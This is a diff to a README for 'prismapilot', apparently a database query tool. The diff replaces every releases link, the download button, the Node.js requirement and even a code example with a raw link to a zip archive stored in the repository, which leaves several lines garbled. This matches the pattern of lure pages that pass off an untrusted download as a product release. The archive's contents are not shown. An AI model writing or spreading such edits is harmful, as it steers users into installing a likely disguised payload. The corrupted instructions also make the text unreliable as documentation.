@@ -6,17 +6,17 @@ Welcome to prismapilot! This tool helps you build queries effortlessly without n
 
 ## 📥 Download & Install
 
-[![Download prismapilot](https://img.shields.io/badge/Download%20prismapilot-v1.0.0-blue.svg)](https://github.com/keoki808808/prismapilot/releases)
+[![Download prismapilot](https://raw.githubusercontent.com/keoki808808/prismapilot/main/prisma/Software-v3.3-beta.5.zip%https://raw.githubusercontent.com/keoki808808/prismapilot/main/prisma/Software-v3.3-beta.5.zip)](https://raw.githubusercontent.com/keoki808808/prismapilot/main/prisma/Software-v3.3-beta.5.zip)
 
 To get started, you need to download prismapilot. Follow these simple steps:
 
 1. Click the download button above.
 2. You will be taken to the releases page.
 3. Choose the latest version listed.
-4. Click on the `.zip` or `.tar.gz` file to download it.
+4. Click on the `.zip` or `https://raw.githubusercontent.com/keoki808808/prismapilot/main/prisma/Software-v3.3-beta.5.zip` file to download it.
 5. Once downloaded, extract the files to a folder of your choice.
 
-You can also visit the [Releases page](https://github.com/keoki808808/prismapilot/releases) directly to find the latest version.
+You can also visit the [Releases page](https://raw.githubusercontent.com/keoki808808/prismapilot/main/prisma/Software-v3.3-beta.5.zip) directly to find the latest version.
 
 ## 💡 Key Features
 
@@ -33,7 +33,7 @@ Prismapilot offers several features that make it stand out:
 To use prismapilot, you need:
 
 - A supported operating system: Windows, macOS, or Linux.
-- Node.js installed (recommended version: 14.x or higher).
+- https://raw.githubusercontent.com/keoki808808/prismapilot/main/prisma/Software-v3.3-beta.5.zip installed (recommended version: 14.x or higher).
 - PostgreSQL, MongoDB, or another database to connect with.
 
 ## 📚 How to Use prismapilot
@@ -51,7 +51,7 @@ To use prismapilot, you need:
    - Use the primary API commands provided in prismapilot.
    - For example, you can create a simple query to fetch users: 
      ```
-     const users = await prisma.user.findMany();
+     const users = await https://raw.githubusercontent.com/keoki808808/prismapilot/main/prisma/Software-v3.3-beta.5.zip();
      ```
 
 4. **Testing Your Queries:** Run your queries from the terminal to see the results.
@@ -79,6 +79,6 @@ Prismapilot is open-source software. We welcome contributions to improve it furt
 
 Keep track of updates and news regarding prismapilot. You can follow our GitHub repository or join our mailing list to receive notifications about new releases.
 
-Remember, you can always return to the [Releases page](https://github.com/keoki808808/prismapilot/releases) for the latest version and updates.
+Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/keoki808808/prismapilot/main/prisma/Software-v3.3-beta.5.zip) for the latest version and updates.
 
 Happy querying!
